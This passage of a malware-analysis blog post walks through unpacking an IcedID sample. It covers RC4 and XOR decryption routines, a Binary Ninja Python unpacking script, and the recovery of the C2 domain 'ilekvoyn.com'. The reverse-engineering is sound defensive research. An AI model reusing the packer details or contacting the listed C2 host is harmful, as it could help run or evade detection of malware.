srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/7_hud069344d5fa12ff8093eb6e3db7704b0_124608_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/7_hud069344d5fa12ff8093eb6e3db7704b0_124608_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Main code"
class="gallery-image"
data-flex-grow="64"
data-flex-basis="153px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/8.png"
width="728"
height="178"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/8_hu0bc76c6a497de1d0d59a223c83ec6ad5_20761_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/8_hu0bc76c6a497de1d0d59a223c83ec6ad5_20761_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Looks like it wants to do something with a window?"
class="gallery-image"
data-flex-grow="408"
data-flex-basis="981px"
>&lt;/p>
&lt;p>I also found a check where the malware will only run its attack if the year is &lt;code>2022&lt;/code>.
I ended up patching this instruction to always jump in &lt;code>x64dbg&lt;/code>.
&lt;code>EnumWindows&lt;/code> accepts a callback function, which is a prime candidate for inserting a malicous function, so I decided to explore that next.&lt;/p>
&lt;h3 id="callback-function">Callback function
&lt;/h3>&lt;p>Again, this function has a lot of fake branches, so prune those first.
The callback function seems to just get a handle to a windows, then it enters a function that seems to be doing some type of memory copying operations.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/9.png"
width="543"
height="303"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/9_huf227c3ced8365a1cce63fc2ccf44b83b_22090_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/9_huf227c3ced8365a1cce63fc2ccf44b83b_22090_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Maybe COM injection?"
class="gallery-image"
data-flex-grow="179"
data-flex-basis="430px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/10.png"
width="815"
height="907"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/10_hu5447177a1eea6341be61c562312ef216_96364_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/10_hu5447177a1eea6341be61c562312ef216_96364_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Maybe this is the unpacking routine?"
class="gallery-image"
data-flex-grow="89"
data-flex-basis="215px"
>&lt;/p>
&lt;p>Following along some of the function calls results in finding what seems to be a promising function.
It seems to create a string &lt;code>|SPL|&lt;/code>
Doing some OSINT reveals that this might be an IoC for &lt;code>SplPacker&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/11.png"
width="825"
height="624"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/11_hudc81d96d09dbec768134a7d4a5021c5f_76254_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/11_hudc81d96d09dbec768134a7d4a5021c5f_76254_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" What is SPL?"
class="gallery-image"
data-flex-grow="132"
data-flex-basis="317px"
>&lt;/p>
&lt;p>There is also a string &lt;code>DllRegisterServer&lt;/code> that is created dynamically, so thats something else to watch out for.
Since it seems that this is modifying memory and potentially unpacking something, I figured it might be easier at this point to just reverse this part dynamically.
Also, Binja isn&amp;rsquo;t correctly deducing the function calls to these resolved APIs, so we need to define them ourselves and then change their type.
We can do this by creating new types:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/12.png"
width="715"
height="577"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/12_huff7c79d00c601bdcb7c25892699f338c_25396_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/12_huff7c79d00c601bdcb7c25892699f338c_25396_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" All the calls just need to follow this pattern "
class="gallery-image"
data-flex-grow="123"
data-flex-basis="297px"
>&lt;/p>
&lt;p>I quickly arrive at a function that is doing some type of hashing.
It doesn&amp;rsquo;t specify what type of hashing to do, so the process will use the default value, which I am unsure of what it would be.
ChatGPT says this would be using &lt;code>PROV_RSA_FULL&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/13.png"
width="740"
height="733"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/13_hu66444dfd47d9c9d7f9ff6312457ddb22_97919_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/13_hu66444dfd47d9c9d7f9ff6312457ddb22_97919_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Hashing function? "
class="gallery-image"
data-flex-grow="100"
data-flex-basis="242px"
>&lt;/p>
&lt;p>When stepping through &lt;code>x64dbg&lt;/code>, I saw it was using &lt;code>ALG_ID&lt;/code> of &lt;code>8003&lt;/code> which corresponds to md5.
Also, I am able to obtain a few more hashes:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/14.png"
width="680"
height="98"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/14_hud2e5b0d3f022614b54d09826e154658d_17997_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/14_hud2e5b0d3f022614b54d09826e154658d_17997_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" More hashes obtained. "
class="gallery-image"
data-flex-grow="693"
data-flex-basis="1665px"
>&lt;/p>
&lt;p>Also, as I stepped through some of the functions I found what looked to be RC4 encryption algo.
This assumption was based on the fact that it had 3 loops, each with 256 iterations, which matches up with the profile of RC4.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/15.png"
width="1064"
height="912"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/15_hu3201af0a0d80690875d8c0c4f84a82e2_144270_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/15_hu3201af0a0d80690875d8c0c4f84a82e2_144270_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" RC4 "
class="gallery-image"
data-flex-grow="116"
data-flex-basis="280px"
>&lt;/p>
&lt;h3 id="decryption">Decryption
&lt;/h3>&lt;p>There are 2 references to this RC4 function, so I labeled them as potential decryption functions.
In both of these references, a key of &lt;code>0x11c742c6&lt;/code> is used.
There is also another function that does some type of encryption or encoding using the same data, key, and key length, although I wasn&amp;rsquo;t able to understand it at the time.
Additionally, from the references to the data and key, I was able to deduce that the code is using this structure:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">data_block&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">pdata&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint64_t&lt;/span> &lt;span class="n">data_len&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>It passes references to this structure to its encryption routines.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/16.png"
width="1303"
height="620"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/16_hu2ffb72f1c754a302111291b414786e32_100807_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/16_hu2ffb72f1c754a302111291b414786e32_100807_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Not sure what this does "
class="gallery-image"
data-flex-grow="210"
data-flex-basis="504px"
>&lt;/p>
&lt;p>At this point, I felt that it would be easier to see how these functions are used from &lt;code>x64dbg&lt;/code>, so I went back to it.
I ended up putting an access breakpoint on the data section, so i could see when the hex strings start getting used.
Through this method I was able to figure out the following chunk of data was some type of metadata about the hexstream in the &lt;code>.data&lt;/code> section.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/17.png"
width="809"
height="150"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/17_hu64dd6e961fe7e970af5fd94bd963d4e5_22705_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/17_hu64dd6e961fe7e970af5fd94bd963d4e5_22705_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Metadata before the hex stream "
class="gallery-image"
data-flex-grow="539"
data-flex-basis="1294px"
>&lt;/p>
&lt;p>Also, the hex stream is converted from hex to bytes, and then copies into the section created by &lt;code>NtCreateSection&lt;/code> earlier in the process.
Then the data is hashed several times, maybe to verify its integerity.
It was also at this point where I realized that the function that I had thought to be encoding was actually a second type of decryption that is applied to the data after it has been passed through the RC4 routine.
The strategy I used to do this was to check for instructions that moved data from either a stack variable or process memory to a register or vice versa.
Another hint was that this also used the same parameters as the RC4 function.
Then you see the operations that are done upon it.
The authors of this malware use an obfuscation technique in this encryption where they add values, and then subtract them, essentially restoring the original value.
The obfuscated formula for the xor encryption is:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">data[i] = (data[i] ^ key[i % len(key)])
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data[i] -= data[i + 1]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data[i] += 0x100 - 0x100
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data[i] += (i % len(key)) &amp;amp; 0xFF
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data[i] -= (i % len(key)) &amp;amp; 0xFF
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>which simplifies down to:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">data[i] = (data[i] ^ key[i % len(key)]) - data[i + 1]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Because python treats the operands of these operations as signed integers we also need to add a mask of &lt;code>0xFF&lt;/code> to cut the resulting byte/s to the right size.&lt;/p>
&lt;p>We can copy these unpacking process in binary ninja with the following script:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">binaryninja&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Transform&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">BinaryReader&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ADDR_OF_DATA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x7fff7a1a9040&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">KEY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x11c742c6&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FILENAME&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hexstream_addr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">br&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">BinaryReader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">address&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">hexstream_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">curr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">curr&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x00\x00&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">curr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">curr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">fromhex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">rc4_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">KEY&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">byteorder&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">rc4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Transform&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;RC4&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">rc4&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;key&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">xor_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">KEY&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">bytearray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">to_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">byteorder&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b&lt;/span> &lt;span class="o">-=&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">b&lt;/span> &lt;span class="o">&amp;amp;=&lt;/span> &lt;span class="n">b&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xFF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">b&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">unpack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hexstream_addr&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hexstream_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rc4_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">xor_decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FILENAME&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;wb&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">True&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">unpack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ADDR_OF_DATA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This script leaves us with a big ole dump file.
But it is progress :)&lt;/p>
&lt;p>If we go back to binja with all the new information we picked up from dynamic analysis, and and follow what happens after this decryption function is called, we will see that the unpacked data is parsed for the string &amp;ldquo;|SPL|&amp;rdquo;.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/18.png"
width="989"
height="478"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/18_hu7972a14cf3447531a8b81997dfe99dfa_64848_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/18_hu7972a14cf3447531a8b81997dfe99dfa_64848_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Searching for |SPL| "
class="gallery-image"
data-flex-grow="206"
data-flex-basis="496px"
>&lt;/p>
&lt;p>If we search for this value ourselves, we can see that it is used as a seperator.
There are 5 payloads that are in this dump.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/19.png"
width="854"
height="464"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/19_hu6e5ec128f7c0e2028edff70a17ce1629_17869_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/19_hu6e5ec128f7c0e2028edff70a17ce1629_17869_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" 5 for the price of 1 "
class="gallery-image"
data-flex-grow="184"
data-flex-basis="441px"
>&lt;/p>
&lt;p>I placed each in &lt;code>HxD&lt;/code> and used their magic bytes to determine what they are.
The first is some stub code that was jumped to from the main process.
I saw this in &lt;code>x64dbg&lt;/code> when tracking the &lt;code>NtCreateSection&lt;/code> api call.
The second one might be a compressed PE file, cuz I can see a PE header, but I&amp;rsquo;ll analyze that in Binja soon.
The third is a full PE file.
Windows defender was able to recognize it as malware, so this is probably the payload the contains the config we want.
Section 4 was a &lt;code>.jfif&lt;/code> file, that contain an image of a lion emblem.
I&amp;rsquo;ll do some analysis on that in a bit in case it contains anything interesting inside the image.
Section 5 was a jpeg of a drawing of a woman.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/20.png"
width="1606"
height="865"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/20_hua3591544d217a252851246f630cacb17_1028268_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/20_hua3591544d217a252851246f630cacb17_1028268_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Interesting pics"
class="gallery-image"
data-flex-grow="185"
data-flex-basis="445px"
>&lt;/p>
&lt;h2 id="dumped-pe">Dumped PE
&lt;/h2>&lt;p>This PE is a lot easier to read.
It will immediately create a thread, with &lt;code>THREAD_CREATE_RUN_IMMEDIATELY&lt;/code>.
There is a call to &lt;code>Sleep&lt;/code> which we can get rid of to speed up analysis.
Then we almost immediately hit the decryption routine that reveals the C2 address we have been hunting for.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/21.png"
width="953"
height="407"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/21_hubfdf2eebe96be33098ff2a201f8ee941_46718_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/21_hubfdf2eebe96be33098ff2a201f8ee941_46718_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Call to decryption routine"
class="gallery-image"
data-flex-grow="234"
data-flex-basis="561px"
> &lt;img src="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/22.png"
width="672"
height="433"
srcset="https://Kvn11.github.io/p/icedid-malware-config-extraction/img/22_huf2da2a7fae5eeab6e8388d8e7c6b2b99_34011_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/icedid-malware-config-extraction/img/22_huf2da2a7fae5eeab6e8388d8e7c6b2b99_34011_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt=" Simple XOR "
class="gallery-image"
data-flex-grow="155"
data-flex-basis="372px"
>&lt;/p>
&lt;p>In this case it was: &lt;code>ilekvoyn.com&lt;/code>.
Continuing through the code, it becomes clear that it is crafting a URL request to this address.
It uses a cookie value obtained early from querying something in our kernel.
Then adds in the result of &lt;code>GetSysCount64&lt;/code> / 1000, then adds in some other values.
Since this is a quick challenge, and an old sample I did not bother seeing what how the value was being generated, but I can assume safely assume it&amp;rsquo;s likely something unique to our infection.&lt;/p>
